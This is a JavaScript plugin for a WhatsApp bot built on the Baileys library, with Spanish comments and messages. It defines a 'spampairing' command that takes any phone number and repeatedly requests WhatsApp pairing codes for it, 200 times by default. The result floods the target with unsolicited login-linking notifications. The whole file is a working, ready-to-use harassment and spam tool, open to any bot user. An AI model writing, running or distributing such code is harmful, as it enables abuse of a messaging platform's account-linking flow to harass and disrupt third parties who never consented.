let handler = async (m, { text, command }) => {
  if (!text) return m.reply(`📌 *Ejemplo:* ${command} +521234567890|150`);

  let [numeroRaw, repeticiones = "200"] = text.split("|");
  let target = numeroRaw.replace(/[^0-9]/g, '').trim();

  if (!target || target.length < 8) return m.reply('⚠️ Número inválido.');
  m.reply(`🚀 Iniciando spam de Pairing Code a: wa.me/${target}\n🔁 Repeticiones: ${repeticiones}`);

  // Importar módulos necesarios
  const { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
  const { version } = await fetchLatestBaileysVersion();
  const { state, saveCreds } = await useMultiFileAuthState('pepek');
  const pino = require('pino');

  // Conexión temporal con impresión de QR activada
  const tempConn = makeWaSocket({
    auth: state,
    version,
    logger: pino({ level: 'silent' }),
    printQRInTerminal: true, // 👈 Esto muestra el QR
  });

  tempConn.ev.on('creds.update', saveCreds);

  // Esperar a que se conecte
  await new Promise((resolve, reject) => {
    tempConn.ev.on('connection.update', (update) => {
      const { connection, lastDisconnect } = update;
      if (connection === 'open') {
        console.log('✅ Sesión temporal conectada');
        resolve();
      } else if (connection === 'close') {
        console.log('❌ Conexión cerrada:', lastDisconnect?.error?.message);
        reject(new Error('Fallo al conectar sesión temporal'));
      }
    });
  });

  const sleep = ms => new Promise(res => setTimeout(res, ms));

  for (let i = 0; i < Number(repeticiones); i++) {
    try {
      await sleep(1500);
      let code = await tempConn.requestPairingCode(target);
      console.log(`[SPAM ${i + 1}] Pairing Code enviado a ${target}: ${code}`);
    } catch (e) {
      console.log(`[ERROR] Fallo en intento ${i + 1}: ${e.message}`);
    }
  }

  await sleep(3000);
  m.reply('✅ Finalizado el spam de Pairing Code.');
};

handler.command = ['spampairing'];
handler.owner = false;
handler.premium = false;
handler.group = false;

export default handler;
